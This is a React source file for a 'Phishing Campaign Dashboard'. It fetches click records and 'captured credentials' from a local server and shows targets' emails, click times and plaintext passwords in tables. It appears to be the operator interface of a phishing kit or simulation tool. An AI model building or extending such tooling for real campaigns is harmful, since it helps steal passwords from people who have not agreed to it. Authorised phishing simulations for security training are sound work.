import React, { useEffect, useState } from "react";

const Dashboard = () => {
  const [clickData, setClickData] = useState([]);
  const [credentialData, setCredentialData] = useState([]);  // State to store captured credentials
  const [message, setMessage] = useState("");

  useEffect(() => {
    const fetchClickData = async () => {
      try {
        const response = await fetch("http://localhost:5000/clicks");
        const data = await response.json();
        setClickData(data);
      } catch (error) {
        console.error("Failed to fetch click data", error);
        setMessage("❌ Failed to load click data.");
      }
    };

    const fetchCredentialData = async () => {
      try {
        const response = await fetch("http://localhost:5000/credentials"); // Update API endpoint to fetch credentials
        const data = await response.json();
        setCredentialData(data);
      } catch (error) {
        console.error("Failed to fetch credentials", error);
        setMessage("❌ Failed to load captured credentials.");
      }
    };

    fetchClickData();
    fetchCredentialData();
  }, []);

  return (
    <div className="p-8">
      <h1 className="text-3xl font-bold text-center text-gray-800 mb-6">
        📊 Phishing Campaign Dashboard
      </h1>

      {/* Click Data Table */}
      <div className="bg-white shadow-md rounded-lg p-6 mb-6">
        <h2 className="text-xl font-semibold mb-4">Click Data</h2>
        <table className="min-w-full border border-gray-300">
          <thead>
            <tr className="bg-gray-100">
              <th className="p-3 border-b">Email</th>
              <th className="p-3 border-b">Timestamp</th>
            </tr>
          </thead>
          <tbody>
            {clickData.length > 0 ? (
              clickData.map((click, index) => (
                <tr key={index} className="hover:bg-gray-50">
                  <td className="p-3 border-b">{click.email}</td>
                  <td className="p-3 border-b">
                    {new Date(click.timestamp).toLocaleString()}
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="2" className="text-center p-4 text-gray-500">
                  No click data available.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* Captured Credentials Table */}
      <div className="bg-white shadow-md rounded-lg p-6">
        <h2 className="text-xl font-semibold mb-4">Captured Credentials</h2>
        <table className="min-w-full border border-gray-300">
          <thead>
            <tr className="bg-gray-100">
              <th className="p-3 border-b">Email</th>
              <th className="p-3 border-b">Password</th>
            </tr>
          </thead>
          <tbody>
            {credentialData.length > 0 ? (
              credentialData.map((cred, index) => (
                <tr key={index} className="hover:bg-gray-50">
                  <td className="p-3 border-b">{cred.email}</td>
                  <td className="p-3 border-b">{cred.password}</td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="2" className="text-center p-4 text-gray-500">
                  No captured credentials available.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {message && <p className="mt-4 text-center text-sm font-medium text-green-600">{message}</p>}
    </div>
  );
};

export default Dashboard;
